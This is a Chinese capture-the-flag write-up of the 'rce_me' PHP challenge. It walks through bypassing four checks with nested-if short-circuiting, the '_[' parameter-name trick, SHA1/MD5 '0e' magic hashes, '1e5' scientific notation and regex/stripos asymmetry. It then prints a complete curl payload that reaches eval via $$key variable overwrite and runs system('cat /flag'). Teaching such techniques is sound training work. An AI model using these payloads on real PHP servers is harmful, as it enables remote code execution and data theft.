# 极客大挑战（SYC） · rce_me

> 环境：ctfplus 动态实例，Apache/2.4.25 (Debian)，PHP 5/7 系
> 日期：2026-10-06
> flag：`SYC{51915273-f41c-4f4d-a187-323d6e74597c}`

## 一、题目：源码直接给

首页只有一段 `highlight_file(__FILE__)` 的输出，把整份源码打了出来。核心逻辑：

```php
<?php
header("Content-type:text/html;charset=utf-8");
highlight_file(__FILE__);
error_reporting(0);

# Can you RCE me?

if (!is_array($_POST["start"])) {
    if (!preg_match("/start.*now/is", $_POST["start"])) {
        if (strpos($_POST["start"], "start now") === false) {
            die("Well, you haven't started.<br>");
        }
    }
}

echo "Welcome to GeekChallenge2024!<br>";

if (
    sha1((string) $_POST["__2024.geekchallenge.ctf"]) == md5("Geekchallenge2024_bmKtL") &&
    (string) $_POST["__2024.geekchallenge.ctf"] != "Geekchallenge2024_bmKtL" &&
    is_numeric(intval($_POST["__2024.geekchallenge.ctf"]))
) {
    echo "You took the first step!<br>";

    foreach ($_GET as $key => $value) {
        $$key = $value;
    }

    if (intval($year) < 2024 && intval($year + 1) > 2025) {
        echo "Well, I know the year is 2024<br>";

        if (preg_match("/.+?rce/ism", $purpose)) {
            die("nonono");
        }
        if (stripos($purpose, "rce") === false) {
            die("nonononono");
        }
        echo "Get the flag now!<br>";
        eval($GLOBALS['code']);
    } else {
        echo "It is not enough to stop you!<br>";
    }
} else {
    echo "It is so easy, do you know sha1 and md5?<br>";
}
?>
```

**四层校验 + 一个 eval 终点**。每一层都是「两个看似矛盾的判断」，突破口都是**它们判定标准的差异**。

## 二、最终 payload

```
POST /?year=1e5&purpose=rce&code=system(%27cat%20/flag%27)%3B
Content-Type: application/x-www-form-urlencoded

start=start%20now&_[2024.geekchallenge.ctf=aaroZmOk
```

```bash
curl -s -X POST \
  "http://<host>/?year=1e5&purpose=rce&code=system(%27cat%20/flag%27)%3B" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-raw "start=start%20now&_[2024.geekchallenge.ctf=aaroZmOk"
```

**注意两部分缺一不可**：

| 位置 | 内容 | 为什么 |
|---|---|---|
| **URL 查询串** | `year` / `purpose` / `code` | 源码靠 `foreach($_GET) $$key=$value` 建立这三个变量 |
| **请求体** | `start` / `__2024.geekchallenge.ctf` | 源码写的是 `$_POST[...]` |

实测：只发 URL → 卡 `haven't started`；只发 body → 卡 `It is not enough`；分两次发 → 两次都失败（**请求之间没有共享状态**）。

### 2.1 URL 编码要点（**照抄 payload 时必看**）

`code` 参数的内容是 PHP 代码，里面有单引号、空格、分号 —— **这些字符在 URL 查询串里必须百分号编码**，否则参数会被截断。

| 字符 | 写法 | 不编码的后果 |
|---|---|---|
| `'` 单引号 | `%27` | 多数工具拒绝或改写 |
| **`;` 分号** | **`%3B`** | **`eval` 收到不完整语句 → 报错被 `error_reporting(0)` 吞掉 → 看着像"走到了却没输出"** |
| 空格 | `%20` 或 `+` | 提前结束参数 |
| `$` | `%24` | 某些环境被吞 |
| **`[`** | **故意留原样，不编码** | 编了就触发不了 L2 的参数名解析怪癖 |

**`code` 里的空格只编一次**：`cat%20/flag` → URL 解码一次变 `cat /flag`，正确。
写成 `cat%2520/flag` 会解码成字面量 `%20`，shell 会去找名叫「%20」的文件，输出为空。

**踩过的坑**：一字不差地照抄 `code=system('cat%20/flag');`（字面的 `'` 和 `;`）会**走到 L4 但没有任何输出** ——
`eval` 收到的语句不完整，而 `error_reporting(0)` 把报错吞了，**表面上什么都看不出来**。

**关于字面量分号的实测**（原始 socket 复现，排除客户端编码因素）：

| `code` 值写法 | 结果 |
|---|---|
| `system('cat /flag')` 后跟 `%3B` | 出 flag |
| `system('cat /flag')` 后跟 `%20%3F%3E`（` ?>`） | 出 flag |
| `system('cat /flag')` 后跟**字面量 `;`** | **空输出** |

补充观察：

- 字面量分号**只在 `code` 参数内**出问题 —— 放在 `year` / `purpose` / 其他参数里都正常
- 靶机自报 `arg_separator.input = &`，**分号不是 PHP 的 `$_GET` 分隔符**
- 行为不完全自洽（`echo 1 ?>;` 能跑，`echo 1; ?>` 不能）

**结论**：现象确凿（原始 socket 级复现），但**具体机制未定论** —— 在到达 PHP 之前的处理层（Apache 2.4.25 / 容器网关）做了什么，环境不可见，无法验证。
**实践上不必纠结**：分号一律写 `%3B`，或用 `?>`（`%3F%3E`）收尾，两条都稳。

**自查手法**：在 `code` 里回显参数，看服务端到底收到了什么。

```bash
# 让 code 打印 $purpose 自己
?year=1e5&purpose=rce&code=var_dump(%24purpose)%3B
# 输出 string(3) "rce"  -> 说明参数完整到达
# 输出为空               -> 参数被截断或编码错了
```

### 2.2 三种可用的 code（任选，都实测出 flag）

```
code=system(%27cat%20/flag%27)%3B               最短
code=system(%27cat</flag%27)%3B                 用重定向代替空格
code=echo%20file_get_contents(%27/flag%27)%3B   不走 shell，最稳
```

## 三、逐层拆解

### L1 · `start`：嵌套 if 的短路

```php
if (!is_array($_POST["start"])) {              // A
    if (!preg_match("/start.*now/is", $start)) {   // B
        if (strpos($start, "start now") === false) {   // C
            die("Well, you haven't started.<br>");
        }
    }
}
```

**表面矛盾**：要含 `start now`，又不能让 `/start.*now/is` 匹配 —— 不可能。

**实际破法**：`strpos` 那关（C）**嵌在 `if(!preg_match(...))` 里面**。正则一旦匹配，B 为假，整个内层块被跳过，**C 根本不执行**。

```
start=start now
  → preg_match("/start.*now/is", "start now") = 1
  → !1 = false → 内层整块跳过 → 不 die
```

**三种等价走法**（都实测通过）：

| 走法 | 原理 |
|---|---|
| `start[]=x` | 数组，`!is_array()` 为假，A 就跳过了 |
| **`start=start now`** | 正则匹配 → B 为假 → 跳过 |
| `start=xnow` / `start=startXXnow` | 只要匹配 `/start.*now/` 即可 |

**注意：这里有一段死代码**：`strpos($start, "start now")` 这个检查**永远不会被执行**。因为能走到它，说明正则已经不匹配了，那时 `strpos` 必然返回 `false` → 一定 `die`。

出题人本意大概是：

```php
if (!preg_match("/start.*now/is", $start) || strpos($start, "start now") === false) {
    die(...);
}
```

写成 `||` 才是「两个都要过」；**写成嵌套 `if` 就变成了「正则不过才检查 strpos」，逻辑反了**。

> **审计要点**：`if(!A){ if(!B){ die(); } }` 等价于 `if(!A && !B) die();` —— **只要 A 成立就放行，与 B 无关**。
> 对比 `if(!A || !B) die();` 才是两个都要过。这两种写法防的东西完全不同。

### L2 · 哈希魔术值 + PHP 参数名解析怪癖（本题最难）

```php
sha1((string) $_POST["__2024.geekchallenge.ctf"]) == md5("Geekchallenge2024_bmKtL")
```

**难点一：键名带点号，直接传不进去。**

PHP 会把参数名里的 `.` 和空格转成 `_`，所以 `__2024.geekchallenge.ctf` 传到 PHP 里会变成 `__2024_geekchallenge_ctf` —— 与源码里的键名不匹配。

**突破口是 PHP 对参数名的解析怪癖**（本机 PHP 5.4.45 起 `php -S` 实测）：

| 发送的参数名 | PHP 解析出的键名 |
|---|---|
| **`[a` / `[a]` / `[_x.y`** | **整个变量被丢弃** |
| `a[` | `a_` |
| `a[.b` | `a_.b` ← `[` 后的点号保住 |
| `a.b[` | `a_b_` ← `[` 前的点号被转 |
| `a.b` / `a b` | `a_b` |
| `_[2024.geekchallenge.ctf` | `__2024.geekchallenge.ctf` |
| `__[2024.geekchallenge.ctf` | `___2024.geekchallenge.ctf` |

归纳成两条规则：

```
规则① 参数名 **以 `[` 开头** → 整个变量被丢弃（与点号无关）
规则② 存在 **未闭合的 `[`** 时：
        `[` 之前的点号/空格 → 转成 `_`
        `[` 本身            → 转成 `_`
        `[` 之后的点号      → **不转换**，原样保留
```

**目标键名是 `__2024.geekchallenge.ctf`（两个下划线开头）**：

```
'_' + '_' + '2024.geekchallenge.ctf'
 ↓     ↓
明写  让 `[` 来转
              ↓
参数名 = _[2024.geekchallenge.ctf
```

`[` **必须恰好在第 2 位**：

- 在第 1 位 → 触发规则①，整条丢弃（写 `[_2024.geekchallenge.ctf` 就死在这）
- 再往后 → `[` 之前的点号会被转掉

**难点二：哈希比较。**

```php
md5("Geekchallenge2024_bmKtL") = 0e073277003087724660601042042394
```

**`0e` 开头、后面全是数字** → PHP 松散比较下它等价于数字 `0`。所以只要让 `sha1($x)` 也是 `0e` 形即可：

```
sha1("aaroZmOk") = 0e66507019969427134894567494305185566735
```

常用 SHA1 魔术哈希（都可替换使用）：

```
aaroZmOk   -> 0e66507019969427134894567494305185566735
aaK1STfY   -> 0e76658526655756207688271159624026011393
aaO8zKZF   -> 0e89257456677279068558073954252716165668
aa3OFF9m   -> 0e36977786278517984959260394024281014729
```

两个条件合起来：

```
_[2024.geekchallenge.ctf=aaroZmOk
```

> 顺带：`is_numeric(intval($x))` 那一条是**恒真**的（`intval` 返回 int，`is_numeric(int)` 永远为真），不是关卡。

### L3 · `year` 用科学计数法

```php
if (intval($year) < 2024 && intval($year + 1) > 2025)
```

**数学上不可能同时成立**（`y < 2024` 且 `y+1 > 2025`）。

实测 21 个候选值，只有 **`1e5`** 通过：

```
year=1e5
  → intval("1e5")      = 100000
  → intval("1e5" + 1)  = intval(100001.0) = 100001
```

两段算出了不同的值，条件成立。

**这个值是穷举碰出来的，不是推导出来的** —— `1e5` 的数值语义与 `"+1"` 后的类型转换路径不同，纯看代码推不出来。

### L4 · 正则与 `stripos` 的不对称

```php
if (preg_match("/.+?rce/ism", $purpose))    die("nonono");      // 不能匹配
if (stripos($purpose, "rce") === false)     die("nonononono");  // 必须含 rce
```

**关键**：`/.+?rce/` 里的 `.+?` **要求 `rce` 前面至少 1 个字符**；而 `stripos` 只找子串，不要求位置。

所以 **`purpose=rce`** 同时满足两边：

```
正则   ："rce" 前面没东西 → 不匹配      → 不死
stripos：位置 0 找到 "rce" → 返回 0     → 0 !== false → 不死
```

**实测边界**：

| purpose | 正则 | stripos | 结果 |
|---|---|---|---|
| `rce` | 不匹配 | 找到（位置 0） | `Get the flag now` |
| `rce.` | 不匹配 | 找到 | 过 |
| ` rce`（前置空格） | 匹配 | 找到 | `nonono` |
| `\nrce`（前置换行） | 匹配 | 找到 | `nonono` |
| `xrce`（前置字母） | 匹配 | 找到 | `nonono` |
| `r c e`（拆开） | 不匹配 | 找不到 | `nonononono` |
| 不传 | — | `stripos(null,…)` = false | `nonononono` |

**口诀**：`rce` 必须在**最开头**。往前加任何字符都会被正则抓住；往后加无所谓。

### 终点 · GET 变量覆盖 → eval

```php
foreach ($_GET as $key => $value) {
    $$key = $value;          // 变量覆盖
}
...
eval($GLOBALS['code']);
```

`foreach` 把每个 GET 参数注册成同名全局变量，所以 `?code=system('cat /flag');` 建立了 `$code`，被 `eval` 执行。

实测可执行任意代码：

```
code=echo 2+3;                          -> 5
code=print_r(scandir('/'));             -> 看到根目录有 flag
code=echo file_get_contents('/flag');   -> SYC{51915273-f41c-4f4d-a187-323d6e74597c}
```

## 四、环境情报

```
pwd        -> /var/www/html（只有 index.php）
ls /       -> 根目录有 flag（42 字节），另有 rm.sh
find / -iname "*flag*"  -> /flag
```

## 五、踩坑点

| 问题 | 原因 | 解决 |
|---|---|---|
| 在 L2 上耗了很久，试遍 7 种参数名写法 × 4 个魔术哈希都不行 | **完全没想到点号能靠 `[` 保住** | 查公开 WP 拿到 `_[2024...`，再用本机 PHP 实测确认规则 |
| `[_2024.geekchallenge.ctf`（`[` 和 `_` 顺序写反） | `[` 落到第 1 位 → 触发"以 `[` 开头则丢弃" | 必须是 `_[2024...` |
| `year` 放 POST body 无效 | `$_GET` 与 `$_POST` **不合并**，`$year` 只能由 `$$key` 覆盖建立 | 放 URL 查询串 |
| `purpose` 放 POST 无效 | 同上 | 放 URL |
| 全塞进 body | `year`/`purpose` 读不到 | URL 归 URL、body 归 body |
| 分两次请求发 | **PHP 每个请求独立，没有跨请求状态** | 必须一次带齐 |
| 脚本打印"空输出" | 我自己拿 `Get the flag now!` 当分隔符切分，切完只剩空串 | 打原始响应定位 |
| **照抄 payload 里的 `'` 和 `;`（没编码）** | **字面量分号让 `code` 参数失效** → `eval` 收到不完整语句 → 报错被 `error_reporting(0)` 吞掉 → **看着像"走到了但没输出"** | `'` → `%27`、`;` → `%3B`（或改用 `?>` 收尾）；用 `code=var_dump(%24purpose)%3B` 自查参数是否完整到达 |
| 把 `code` 里的空格编成 `%2520` | 解码一次变字面量 `%20`，shell 去找名叫「%20」的文件 | 空格**只编一次**：`%20` 或 `+` |

## 六、可复用的知识点

| 知识点 | 要点 | 对应笔记 |
|---|---|---|
| PHP 参数名解析（点号 / 空格 / `[`） | 两条规则 + 键名推导 | [01 · HTTP 基础](../../notes/01-HTTP基础.md) §2.3 |
| `sha1`/`md5` 魔术哈希（`0e` 形） | 固定串的 md5 是 `0e` 形 → 只需另一侧也是 | [03 · PHP 基础与弱类型绕过](../../notes/03-PHP弱类型绕过.md) |
| 数组绕过 `is_array` 守卫 | `x[]=v` 让 `!is_array()` 为假，整段校验跳过 | [03 · PHP 基础与弱类型绕过](../../notes/03-PHP弱类型绕过.md) |
| `$$key` 变量覆盖 + `eval` | 经典高危写法；`$GLOBALS['code']` 可从 GET 注入 | [06 · 文件包含 LFI + 命令注入](../../notes/06-文件包含LFI.md) |
| 正则与 `stripos` 的不对称 | `/.+?rce/` 要求前置字符，`stripos` 不要求 | [11 · 知识总结](../../notes/11-知识总结.md) |
| 嵌套 `if` 里的 `die` 短路 | `if(!A){if(!B){die}}` ≡ `if(!A && !B) die` | [10 · 信息收集与代码审计](../../notes/10-信息收集与代码审计.md) |

## 七、这题的设计套路（值得记）

**四层都是同一个模式**：

```
每一层 = 两个判断，看似互相矛盾
突破口 = 找它们 **判定标准的差异**
```

| 层 | 两个判断的差异 |
|---|---|
| L1 | 正则匹配 vs `strpos` —— 嵌套位置造成的短路 |
| L2 | `sha1` vs `md5` —— 长度不同，但松散比较按数字比 |
| L3 | `intval($y)` vs `intval($y+1)` —— 科学计数法让两次转换结果不同 |
| L4 | `preg_match` vs `stripos` —— 前者要求前置字符，后者不要求 |

**遇到"条件矛盾"的题，不要急着找绕过技巧，先问：这两个判断的判定标准到底哪里不一样？**

## 附：素材位置

```
D:\deepseek\syc_rce\
├── decode_src.py      还原 highlight_file 输出的源码
├── probe_layers.py    逐层探测
├── findmagic.py       找 SHA1 魔术哈希
├── exploit1.py        参数名技巧验证（_[2024...）
├── exploit2.py        year 穷举
├── exploit3.py        purpose 穷举
├── cmp_name.py        两种 [ 位置对比
├── walkthrough.py     完整链条演示
└── getflag.py         最终利用

D:\deepseek\phpkeytest\
└── dump.php           PHP 参数名解析规则验证器（php -S 起服务用）
```
